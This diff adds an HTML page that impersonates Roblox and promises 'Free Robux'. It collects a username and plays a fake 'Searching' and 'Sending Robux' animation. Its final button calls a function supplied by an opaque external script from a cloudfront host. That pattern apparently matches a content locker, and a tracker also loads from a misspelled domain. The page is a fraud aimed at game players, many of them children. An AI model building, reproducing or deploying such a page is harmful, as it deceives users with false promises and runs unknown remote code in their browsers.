@@ -1,0 +1,547 @@
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <style>
+        @import url("https://fonts.googleapis.com/css2?family=Kumbh+Sans:wght@520&family=Mochiy+Pop+One&family=Nunito:wght@200&family=Poppins:wght@400;600;700;900&family=REM:wght@300&family=Varela+Round&display=swap");
+        * {
+           margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: "Kumbh Sans", sans-serif;
+}
+
+.logo {
+  width: 30px;
+  display: flex;
+  align-items: center;
+}
+
+.logo span {
+  font-weight: 900;
+  margin-right: 18px;
+  font-size: 25px;
+}
+nav {
+  width: 100%;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background-color: #dee1e3;
+  border: solid #c7cbce;
+  border-width: 0 0 1px;
+  padding: 0 40px;
+}
+
+nav ul {
+  list-style: none;
+  display: flex;
+}
+
+body {
+  background-color: #f2f4f5;
+  color: #393b3d;
+}
+img {
+  width: 100%;
+}
+
+ul li {
+  margin-left: 30px;
+}
+
+.middle {
+  width: 70%;
+  margin: 10px auto;
+  height: 135px;
+    background-image: linear-gradient(0deg, rgba(39, 39, 46, .5), rgba(39, 39, 46, .5)), url(https://images.rbxcdn.com/9a75b1267d260322206e98bd256138d4-premium_title_bg.jpg);
+  background-position: bottom;
+  background-size: 100%;
+  margin-bottom: 24px;
+  color: #fff;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+  text-align: center;
+}
+
+.middle h2 {
+  margin-bottom: 10px;
+  font-size: 35px;
+}
+.middle p {
+  font-size: 17px;
+}
+
+body .para {
+  font-size: 10px;
+  font-weight: 500;
+  margin-top: 50px;
+  color: #606162;
+  text-align: center;
+  width: 100%;
+  margin: 50px auto;
+}
+.box_con {
+  margin: 0 auto;
+  background-color: #fff;
+  min-height: 163px;
+  width: 70%;
+  font-size: 20px;
+  padding: 20px;
+  border: solid #c7cbce;
+  border-width: 1px 1px 1px;
+}
+input {
+  padding: 11px 15px;
+  border: none;
+  background: #f2f4f5;
+  border-radius: 9px;
+  outline: none;
+  font-size: 17px;
+}
+
+button {
+  background: #393b3d;
+  outline: none;
+  border: none;
+  color: #fff;
+  padding: 8px 10px;
+
+  border-radius: 5px;
+  font-weight: 600;
+  letter-spacing: 1px;
+  font-size: 14px;
+  cursor: pointer;
+  margin-top: 30px;
+}
+
+.box2 {
+  display: none;
+}
+
+.box3 {
+  display: none;
+}
+.box4 {
+  display: none;
+}
+
+.container {
+  display: flex;
+  flex-direction: column;
+  background-color: #ffffffbc;
+  border-radius: 8px;
+}
+
+.row {
+  display: flex;
+  align-items: center;
+  height: 70px;
+  justify-content: space-around;
+}
+.row:not(.row:last-child) {
+  border-bottom: 1px solid #bdbebe;
+}
+.price {
+  font-size: 20px;
+  font-weight: 700;
+}
+.robux_total {
+  display: flex;
+  align-items: center;
+}
+.details:hover {
+  background-color: rgb(226, 226, 226);
+}
+.pic {
+  width: 30px;
+  margin-right: 10px;
+  pointer-events: none;
+  margin-top: 2px;
+}
+span {
+  font-size: 20px;
+  font-weight: 800;
+  color: rgba(0, 0, 0, 0.6);
+}
+img {
+  width: 100%;
+}
+
+h3 {
+  font-size: 32px;
+  margin-bottom: 21px;
+}
+.details {
+  border: 1px solid #b8b8b8;
+  border-radius: 8px;
+  padding: 5px 8px;
+  width: 180px;
+  display: flex;
+  justify-content: center;
+  cursor: pointer;
+  transition: 0.3s;
+}
+
+.folding {
+  margin: 20px auto;
+  width: 100px;
+  height: 100px;
+  position: relative;
+  transform: rotateZ(45deg);
+}
+
+.square {
+  position: absolute;
+  top: 36%;
+  right: 35%;
+  width: 30px;
+  height: 30px;
+  background-color: #fff;
+  transform: rotateZ(87deg);
+}
+.folding .sk-cube {
+  float: left;
+  width: 50%;
+  height: 50%;
+  position: relative;
+  transform: scale(1.1);
+}
+
+.folding .sk-cube:before {
+  content: "";
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: #333;
+  animation: sk-foldCubeAngle 2.4s infinite linear both;
+  transform-origin: 100% 100%;
+}
+
+.folding .sk-cube2 {
+  transform: scale(1.1) rotateZ(90deg);
+}
+
+.folding .sk-cube3 {
+  transform: scale(1.1) rotateZ(180deg);
+}
+
+.folding .sk-cube4 {
+  transform: scale(1.1) rotateZ(270deg);
+}
+
+.folding .sk-cube2:before {
+  animation-delay: 0.3s;
+}
+
+.folding .sk-cube3:before {
+  animation-delay: 0.6s;
+}
+
+.folding .sk-cube4:before {
+  animation-delay: 0.9s;
+}
+
+@keyframes sk-foldCubeAngle {
+  0%,
+  10% {
+    transform: perspective(140px) rotateX(-180deg);
+    opacity: 0;
+  }
+  25%,
+  75% {
+    transform: perspective(140px) rotateX(0deg);
+    opacity: 1;
+  }
+  90%,
+  100% {
+    transform: perspective(140px) rotateY(180deg);
+    opacity: 0;
+  }
+}
+@media (max-width: 400px) {
+  nav {
+    padding: 0 5px;
+  }
+}
+
+@media (max-width: 1042px) {
+  .middle,
+  .box_con,
+  .para {
+    width: 90%;
+  }
+}
+
+@media (max-width: 750px) {
+  .middle,
+  .box_con {
+    width: 100%;
+  }
+  .para {
+    width: 100%;
+  }
+  .middle h2 {
+    margin-bottom: 10px;
+    font-size: 30px;
+  }
+  .middle p {
+    font-size: 13px;
+  }
+}
+
+@media (max-width: 373px) {
+  .logo span {
+    display: none;
+  }
+  nav {
+    padding: 0px;
+  }
+}
+
+@media (max-width: 442px) {
+
+  nav {
+    padding: 0px 20px;
+  }
+}
+
+@media (max-width: 396px) {
+
+  nav {
+    padding: 0px 10px;
+  }
+}
+    </style>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">
+        var _Hasync = _Hasync || [];
+        _Hasync.push(['Histats.start', '1,2859602,4,0,0,0,00000000']);
+        _Hasync.push(['Histats.fasi', '1']);
+        _Hasync.push(['Histats.track_hits', '']);
+        (function () {
+            var hs = document.createElement('script');
+            hs.type = 'text/javascript';
+            hs.async = true;
+            hs.src = ('//s10.histaWts.com/js15_as.js');
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+        })();
+    </script>
+    </script>
+   <script type="text/javascript">
+    var PxZvh_IFY_qQEzlc={"it":4507479,"key":"86cfc"};
+</script>
+<script src="https://dfmpe7igjx4jo.cloudfront.net/9621def.js"></script>
+    <link rel="me" href="https://www.blogger.com/profile/06265001704990899128" />
+    <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
+    <meta name='google-adsense-platform-domain' content='blogspot.com' />
+<link rel="me" href="https://www.blogger.com/profile/02526060061566036521" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/12366971057665444125" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://draft.blogger.com/profile/03979892336730309534" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/17743463312917008979" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/08773859217622524506" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/02751806685999209805" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/04293219699897484278" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/16133502446845024737" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/16133502446845024737" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/04461109458330931741" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/04168347238037683867" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/17055317197004968997" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+
+<body>
+    <nav>
+        <div class="logo">
+            <span>&#9776;</span>
+            <img src="https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExY3N0cWlyZG83amlvcXVnOXMxNGRjOHJyNXFmbjB3Nnk1NXc4cDFkNSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/1QcqLUCuQca1edQ0rK/giphy.webp" alt="">
+        </div>
+        <ul>
+            <li>Discover</li>
+            <li>Marketplace</li>
+            <li>Robux</li>
+        </ul>
+    </nav>
+
+    <div class="middle">
+        <h2>Free Robux - Limited Time</h2>
+        <p>Robux allows you to purchase upgrades for your avatar or buy special abilities in experiences.</p>
+    </div>
+
+    <div class="box_con">
+        <div class="box">
+            <h3>Roblox username</h3><br>
+            <input class="username" type="text" name="" placeholder="Enter username"><br>
+            <button class="getrbx">Get Robux</button>
+        </div>
+        <div class="box2">
+            <div class="folding">
+                <div class="sk-cube1 sk-cube"></div>
+                <div class="sk-cube2 sk-cube"></div>
+                <div class="sk-cube4 sk-cube"></div>
+                <div class="sk-cube3 sk-cube"></div>
+                <div class="square"></div>
+            </div>
+            <p class="useroutput" style="text-align: center; margin-top: 30px;">searching for amjad ...</p>
+        </div>
+        <div class="box3">
+            <div class="container">
+                <div class="row">
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="https://zr-dqb.pages.dev/robux-removebg-preview.png"></div><span>40.000</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="https://zr-dqb.pages.dev/robux-removebg-preview.png"></div><span>20.000</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="https://zr-dqb.pages.dev/robux-removebg-preview.png"></div><span>10.000</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="https://zr-dqb.pages.dev/robux-removebg-preview.png"></div><span>5.000</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="box4">
+            <p>Don't miss out on this chance to make your Roblox adventures even more thrilling. Start now and dive into a world of unlimited possibilities with your free Robux. Happy gaming!
+
+</p>
+            <button onclick="_WT()"dir="rtl" style="background-color: #393B3D;" style="font-size: 19px;">Click Here</button>
+        </div>
+    </div>
+    <div class="para">
+        
+        <div class="colum-con">
+            <div class="column">
+                <div class="image" style="width: 45px;">
+                    <img src="sara1.png" alt="">
+                </div>
+                <div>
+            </div>
+            <div class="column">
+                <div class="image" style="width: 45px;">
+                    <img src="samue.png" alt="">
+                </div>
+                <div>
+                 
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+const rbxbtn = document.querySelector(".getrbx");
+
+const box1 = document.querySelector(".box");
+const box2 = document.querySelector(".box2");
+const box3 = document.querySelector(".box3");
+const box4 = document.querySelector(".box4");
+const rbxtotal = document.querySelectorAll(".details");
+
+const username = document.querySelector(".username");
+
+const useroutput = document.querySelector(".useroutput");
+
+rbxbtn.addEventListener("click", () => {
+  if (username.value.length <= 2) {
+    alert("please enter username");
+  } else {
+    box1.style.display = "none";
+    box2.style.display = "block";
+    setTimeout(showbox2, 4500);
+    setTimeout(showbox3, 4500);
+  }
+
+  useroutput.innerHTML = `Searching for <b>${username.value}</b> ...`;
+});
+
+rbxtotal.forEach((btn) => {
+  btn.addEventListener("click", () => {
+    box3.style.display = "none";
+
+    box2.style.display = "block";
+
+    setTimeout(showboxagain, 2500);
+    setTimeout(showbox4, 2500);
+    useroutput.innerHTML = `Sending Robux to <b>${username.value}</b>...`;
+  });
+});
+
+let showboxagain = () => {
+  box2.style.display = "none";
+};
+let showbox2 = () => {
+  box2.style.display = "none";
+};
+
+let showbox3 = () => {
+  box3.style.display = "block";
+};
+
+let showbox4 = () => {
+  box4.style.display = "block";
+};
+
+    </script>
+</body>
+
+</html>
